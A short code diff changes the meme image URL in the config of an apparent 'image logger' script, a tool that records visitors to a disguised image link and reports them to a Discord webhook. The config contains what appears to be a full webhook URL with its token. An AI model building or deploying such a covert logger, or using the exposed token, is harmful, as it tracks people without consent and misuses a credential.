@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1484326843996962889/qhvlNQwqYLoefUqIdwLwCSCJtv8sVypxwnd6V4FXYpbpmwFgiD5FYP3fZq17EzHCUxNk",
-    "image": "https://i.kym-cdn.com/entries/icons/original/000/047/549/kurt_angle_meme.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/xiA7X4kN5AAAAAAi/baller-baller-meme.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
